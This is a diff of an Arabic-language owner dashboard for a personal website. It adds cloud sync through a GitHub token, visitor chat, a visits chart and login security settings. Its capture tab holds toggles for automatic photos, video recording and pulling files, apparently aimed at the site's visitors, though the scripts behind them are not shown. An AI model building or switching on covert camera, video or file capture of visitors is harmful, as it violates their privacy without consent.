@@ -19,8 +19,8 @@
   .login input{width:100%;padding:11px;margin-bottom:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;font-family:inherit}
   .login button{width:100%;padding:11px;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;font-family:inherit}
   .dash{max-width:900px;margin:0 auto}
-  .tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:10px}
-  .tab{padding:7px 12px;background:var(--card);border:1px solid var(--border);border-radius:9px;cursor:pointer;color:var(--text-dim);font-size:12px;transition:all .3s;font-family:inherit}
+  .tabs{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:10px}
+  .tab{padding:6px 10px;background:var(--card);border:1px solid var(--border);border-radius:8px;cursor:pointer;color:var(--text-dim);font-size:11px;transition:all .3s;font-family:inherit}
   .tab.active{background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;font-weight:700}
   .panel{display:none;background:var(--card);padding:20px;border-radius:14px;border:1px solid var(--border);margin-bottom:16px;backdrop-filter:blur(20px)}
   .panel.active{display:block}
@@ -28,7 +28,7 @@
   .field label{display:block;margin-bottom:5px;color:var(--accent);font-size:12px;font-weight:600}
   .field input,.field textarea,.field select{width:100%;padding:9px;background:var(--bg-2);border:1px solid var(--border);border-radius:9px;color:var(--text);font-size:13px;font-family:inherit}
   .field textarea{min-height:70px;resize:vertical}
-  .save-btn{padding:9px 18px;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;border:none;border-radius:9px;font-weight:700;cursor:pointer;margin-top:8px;font-family:inherit;font-size:13px}
+  .save-btn{padding:9px 18px;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;border:none;border-radius:9px;font-weight:700;cursor:pointer;margin-top:8px;font-family:inherit;font-size:12px}
   .item-row{display:flex;gap:6px;padding:7px;background:var(--bg-2);border-radius:9px;margin-bottom:6px;align-items:center}
   .item-row input{flex:1;padding:7px;background:var(--card);border:1px solid var(--border);border-radius:7px;color:var(--text);font-size:12px;font-family:inherit}
   .item-row button{background:#dc143c;color:#fff;border:none;border-radius:7px;padding:5px 9px;cursor:pointer;font-size:11px}
@@ -41,8 +41,16 @@
   .toggle input{width:auto;transform:scale(1.2)}
   .msg{padding:9px;background:rgba(34,197,94,.15);color:#4ade80;border:1px solid rgba(34,197,94,.3);border-radius:8px;margin-bottom:10px;display:none;font-size:12px}
   .preview-img{width:100px;height:100px;border-radius:50%;object-fit:cover;border:3px solid var(--accent);margin:10px 0;background:var(--bg-2)}
-  .visitor-row,.msg-row{padding:10px;background:var(--bg-2);border-radius:9px;margin-bottom:6px;font-size:11px;color:var(--text-dim);line-height:1.6}
-  .visitor-row b,.msg-row b{color:var(--accent)}
+  .visitor-row,.msg-row,.chat-row{padding:10px;background:var(--bg-2);border-radius:9px;margin-bottom:6px;font-size:11px;color:var(--text-dim);line-height:1.6}
+  .chat-row.owner{background:rgba(139,92,246,.15);border-right:3px solid #8b5cf6}
+  .chat-row.visitor{background:rgba(37,211,102,.1);border-right:3px solid #25d366}
+  .chat-input-row{display:flex;gap:6px;margin-top:10px}
+  .chat-input-row input{flex:1;padding:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:13px;font-family:inherit}
+  .chat-input-row button{padding:10px 16px;background:var(--accent);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-family:inherit}
+  .status-badge{display:inline-block;padding:3px 8px;border-radius:6px;font-size:10px;font-weight:700;margin-right:6px}
+  .status-badge.ok{background:rgba(34,197,94,.2);color:#4ade80}
+  .status-badge.err{background:rgba(220,20,60,.2);color:#ff5470}
+  canvas{max-width:100%;margin-top:12px}
 </style>
 </head>
 <body>
@@ -57,14 +65,15 @@
 
 <div class="login" id="login">
   <h2>دخول المالك</h2>
-  <input id="user" placeholder="اسم المستخدم" autocomplete="username">
-  <input id="pass" type="password" placeholder="كلمة السر" autocomplete="current-password">
+  <input id="user" placeholder="اسم المستخدم">
+  <input id="pass" type="password" placeholder="كلمة السر">
   <button id="loginBtn">دخول</button>
 </div>
 
 <div class="dash" id="dash" style="display:none">
   <div id="msg" class="msg"></div>
   <div class="tabs">
+    <button class="tab" data-tab="cloud">☁️ السحابة</button>
     <button class="tab active" data-tab="sitename">اسم الموقع</button>
     <button class="tab" data-tab="avatar">الصورة</button>
     <button class="tab" data-tab="info">البيانات</button>
@@ -73,20 +82,46 @@
     <button class="tab" data-tab="links">الروابط</button>
     <button class="tab" data-tab="theme">الثيم</button>
     <button class="tab" data-tab="capture">التصوير</button>
-    <button class="tab" data-tab="visitors">الزوار</button>
-    <button class="tab" data-tab="messages">الرسائل</button>
-    <button class="tab" data-tab="stats">الإحصائيات</button>
-    <button class="tab" data-tab="backup">نسخ احتياطي</button>
+    <button class="tab" data-tab="chat">💬 الشات</button>
+    <button class="tab" data-tab="visitors">👁️ الزوار</button>
+    <button class="tab" data-tab="stats">📊 إحصائيات</button>
+    <button class="tab" data-tab="security">🔒 أمان</button>
+    <button class="tab" data-tab="backup">💾 نسخ احتياطي</button>
+  </div>
+
+  <div class="panel" id="panel-cloud">
+    <h3 style="color:var(--accent);margin-bottom:10px">☁️ التخزين السحابي (GitHub Gist)</h3>
+    <p style="color:var(--muted);font-size:12px;line-height:1.7;margin-bottom:12px">
+      البيانات تتخزن في Gist على حسابك — لا تمسح أبداً.<br>
+      <b>الخطوات:</b><br>
+      1. افتح https://github.com/settings/tokens/new<br>
+      2. Note: taha-site — Scopes: ✅ gist<br>
+      3. Generate token → انسخه (ghp_...)<br>
+      4. الصقه هنا
+    </p>
+    <div class="field"><label>GitHub Token</label><input id="githubToken" placeholder="ghp_xxxxxxxxxxxx" type="password"></div>
+    <div class="field"><label>Gist ID (لو موجود)</label><input id="gistId" placeholder="يُنشأ تلقائياً"></div>
+    <button class="save-btn" id="saveCloud">حفظ وتفعيل</button>
+    <button class="save-btn" id="syncNow" style="background:#8b5cf6;color:#fff">🔄 مزامنة الآن</button>
+    <button class="save-btn" id="testCloud" style="background:#4ade80;color:#000">✅ اختبار</button>
+    <p style="margin-top:14px;font-size:12px" id="cloudStatus"><span class="status-badge err">غير مفعل</span></p>
   </div>
 
   <div class="panel active" id="panel-sitename">
     <div class="field"><label>اسم الموقع</label><input id="fSiteName" placeholder="طه"></div>
+    <div class="field"><label>شكل الصورة والاسم</label>
+      <select id="fHeroStyle">
+        <option value="circle">دائرة فوق الاسم</option>
+        <option value="behind">خلف الاسم (شفافة)</option>
+        <option value="side">على جنب الاسم</option>
+      </select>
+    </div>
     <button class="save-btn" id="saveSiteName">حفظ</button>
   </div>
 
   <div class="panel" id="panel-avatar">
     <img id="avatarPreview" class="preview-img" alt="">
-    <div class="field"><label>رفع صورة</label><input type="file" id="avatarFile" accept="image/*"></div>
+    <div class="field"><label>رفع صورة (تُخزن في Catbox للأبد)</label><input type="file" id="avatarFile" accept="image/*"></div>
     <div class="field"><label>أو رابط صورة</label><input id="avatarUrl" placeholder="https://..."></div>
     <button class="save-btn" id="saveAvatar">حفظ الصورة</button>
     <button class="save-btn" id="removeAvatar" style="background:#dc143c;color:#fff">حذف</button>
@@ -102,25 +137,24 @@
     <div class="field"><label>واتساب</label><input id="fWA"></div>
     <div class="field"><label>فيسبوك</label><input id="fFB"></div>
     <div class="field"><label>إنستجرام</label><input id="fIG"></div>
-    <button class="save-btn" id="saveInfo">حفظ البيانات</button>
+    <button class="save-btn" id="saveInfo">حفظ</button>
   </div>
 
   <div class="panel" id="panel-features">
-    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">بطاقات الميزات والمواهب</p>
     <div id="featuresList"></div>
-    <button class="add-btn" id="addFeature">+ إضافة ميزة</button>
+    <button class="add-btn" id="addFeature">+ ميزة</button>
     <button class="save-btn" id="saveFeatures">حفظ</button>
   </div>
 
   <div class="panel" id="panel-gallery">
-    <div class="field"><label>رابط صورة أو رفع</label><input id="galleryUrl" placeholder="https://..."><input type="file" id="galleryFile" accept="image/*" style="margin-top:6px"></div>
+    <div class="field"><label>رابط أو رفع صورة</label><input id="galleryUrl" placeholder="https://..."><input type="file" id="galleryFile" accept="image/*" style="margin-top:6px"></div>
     <button class="add-btn" id="addGallery">+ إضافة</button>
     <div id="galleryList" style="margin-top:12px"></div>
   </div>
 
   <div class="panel" id="panel-links">
     <div id="linksList"></div>
-    <button class="add-btn" id="addLink">+ رابط جديد</button>
+    <button class="add-btn" id="addLink">+ رابط</button>
     <button class="save-btn" id="saveLinks">حفظ</button>
   </div>
 
@@ -142,18 +176,23 @@
   <div class="panel" id="panel-capture">
     <div class="toggle"><span>📸 تصوير تلقائي</span><input type="checkbox" id="camToggle"></div>
     <div class="toggle"><span>🎥 تسجيل فيديو</span><input type="checkbox" id="vidToggle"></div>
-    <div class="toggle"><span>📁 سحب الملفات</span><input type="checkbox" id="dropToggle"></div>
+    <div class="toggle"><span>📁 سحب ملفات</span><input type="checkbox" id="dropToggle"></div>
     <button class="save-btn" id="saveCapture">حفظ</button>
   </div>
 
-  <div class="panel" id="panel-visitors">
-    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">آخر الزوار (200)</p>
-    <div id="visitorsList"></div>
+  <div class="panel" id="panel-chat">
+    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">💬 الرسائل مع الزوار (تحديث تلقائي كل 10 ثواني)</p>
+    <div id="chatBox" style="max-height:400px;overflow-y:auto;background:var(--bg-2);padding:10px;border-radius:10px;margin-bottom:10px"></div>
+    <div class="chat-input-row">
+      <input id="chatReply" placeholder="اكتب ردك...">
+      <button id="chatSend">إرسال</button>
+    </div>
+    <button class="save-btn" id="chatRefresh" style="margin-top:8px">🔄 تحديث</button>
   </div>
 
-  <div class="panel" id="panel-messages">
-    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">الرسائل الواردة</p>
-    <div id="messagesList"></div>
+  <div class="panel" id="panel-visitors">
+    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">آخر الزوار (محدث تلقائياً من السحابة)</p>
+    <div id="visitorsList"></div>
   </div>
 
   <div class="panel" id="panel-stats">
@@ -164,17 +203,31 @@
       <div class="stat"><b id="sGallery">0</b><small>معرض</small></div>
       <div class="stat"><b id="sLinks">0</b><small>روابط</small></div>
     </div>
-    <button class="save-btn" id="refreshStats" style="margin-top:12px">تحديث</button>
+    <h3 style="color:var(--accent);margin-top:20px;font-size:14px">📈 الزيارات (آخر 7 أيام)</h3>
+    <canvas id="visitsChart" height="120"></canvas>
+    <button class="save-btn" id="refreshStats" style="margin-top:10px">🔄 تحديث</button>
+  </div>
+
+  <div class="panel" id="panel-security">
+    <h3 style="color:var(--accent);margin-bottom:10px">🔒 الأمان</h3>
+    <div class="toggle"><span>قفل اللوحة بعد 5 محاولات فاشلة</span><input type="checkbox" id="lockToggle" checked></div>
+    <div class="field"><label>مدة القفل (دقائق)</label><input id="lockDuration" type="number" value="15" min="1"></div>
+    <div class="field"><label>إشعار تليجرام عند كل دخول</label><input type="checkbox" id="notifyLogin" checked></div>
+    <button class="save-btn" id="saveSecurity">حفظ</button>
+    <p style="color:var(--muted);font-size:11px;margin-top:14px">آخر محاولات الدخول:</p>
+    <div id="loginLog"></div>
   </div>
 
   <div class="panel" id="panel-backup">
-    <button class="save-btn" id="exportBtn">📥 تصدير</button>
+    <button class="save-btn" id="exportBtn">📥 تصدير JSON</button>
     <div class="field" style="margin-top:12px"><label>استيراد</label><input type="file" id="importFile" accept=".json"></div>
     <button class="save-btn" id="resetBtn" style="background:#dc143c;color:#fff">🗑️ إعادة تعيين</button>
   </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 <script src="config.js"></script>
+<script src="sync.js"></script>
 <script src="admin.js"></script>
 </body>
 </html>
